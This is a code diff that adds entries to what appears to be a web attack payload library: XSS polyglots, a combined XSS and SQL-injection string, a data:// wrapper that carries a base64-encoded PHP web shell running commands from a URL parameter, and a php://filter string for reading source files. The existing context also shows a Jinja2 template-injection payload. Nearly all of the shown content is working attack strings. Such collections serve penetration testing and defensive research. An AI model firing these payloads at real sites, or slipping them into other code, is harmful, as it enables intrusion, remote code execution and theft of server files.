@@ -396,6 +396,19 @@ export const Payload = {
         },
     },
 
+    Polyglot: {
+        Universal: {
+            // Famous polyglot by 0xSobky
+            authBypassXSS: () => 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
+            simpleXSSSQLi: () => '\'"> <script>alert(1)</script> OR 1=1--',
+            generic: () => 'javascript://%250Aalert(1)//"/*\'/*"/*\'/*--"/*--%> </Title/</Style/</Script/</TextArea/ <script> alert(1) </script> \'> <img src=x onerror=alert(1)>',
+        },
+        LFI_RCE: {
+            dataWrapper: () => 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAiShellExec\"; ?>',
+            phpFilter: () => 'php://filter/convert.base64-encode/resource=index.php',
+        }
+    },
+
     SSTI: {
         Jinja2: {
             tuple2AllSubclasses: () => '{{().__class__.__base__.__subclasses__()}}',
